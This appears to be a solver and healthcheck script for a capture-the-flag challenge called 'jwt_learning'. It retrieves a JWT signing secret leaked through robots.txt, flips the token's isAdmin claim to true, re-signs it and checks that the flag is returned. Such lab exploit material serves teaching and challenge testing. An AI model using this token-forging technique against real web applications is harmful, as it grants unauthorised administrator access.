import os

# pip3 install PyJWT
import jwt

# pip3 install requests
import requests

import sys


BASE_CHAL_URL = os.getenv('BASE_CHAL_URL') or 'http://localhost:3000/'
if not BASE_CHAL_URL.endswith('/'):
    BASE_CHAL_URL += '/'

COOKIE_NAME = 'access-token'
USERNAME = 'wowza'

TOKEN_SECRET_NAME = 'TOKEN_SECRET.txt'


def get(url, **args):
    result = requests.get(url, **args)

    if result.status_code != 200:
        print('Failed: Unexpected response', result.status_code, url)
        sys.exit(1)

    return result


# verify /get-token works as expected
get_token_url = BASE_CHAL_URL + f'get-token?username={USERNAME}'
result = get(get_token_url)

token1 = result.cookies.get(COOKIE_NAME)
if token1 is None:
    print('Failed: /get-token did not return a token')
    sys.exit(1)
# print(token1)


# verify /get-flag does not yield the flag with the first token
get_flag_url = BASE_CHAL_URL + 'get-flag'
result = get(get_flag_url, cookies={COOKIE_NAME: token1})

if 'you cannot have the flag' not in result.text:
    print('Failed: Unexpected response from /get-flag (1)')
    sys.exit(1)

if f'"username":"{USERNAME}","isAdmin":false' not in result.text:
    print('Failed: Unexpected response from /get-flag (2)')
    sys.exit(1)

if 'wctf{' in result.text:
    print('Failed: Unexpected response from /get-flag (3)')
    sys.exit(1)
# print(result.text)


# verify /robots.txt cites token secret resource
robots_url = BASE_CHAL_URL + 'robots.txt'
result = get(robots_url)

if TOKEN_SECRET_NAME not in result.text:
    print('Failed: Unexpected response from robots.txt')
    sys.exit(1)


# verify token secret url yields a non-empty response
token_secret_url = BASE_CHAL_URL + TOKEN_SECRET_NAME
result = get(token_secret_url)

signing_secret = result.text
if not signing_secret:
    print(f'Failed: Unexpected response from {TOKEN_SECRET_NAME}')
    sys.exit(1)
# print(signing_secret)


# flip isAdmin to True in first token
payload = jwt.decode(token1, options={"verify_signature": False})
payload['isAdmin'] = True


# mint a second token with the signing secret
token2 = jwt.encode(payload, signing_secret, algorithm="HS256")
# print(token2)


# verify we can get the flag with the new token
result = get(get_flag_url, cookies={COOKIE_NAME: token2})
# print(result.text)

if 'wctf{' not in result.text:
    print('Failed: Failed to get the flag with new token')
    sys.exit(1)

print('Passed: jwt_learning')

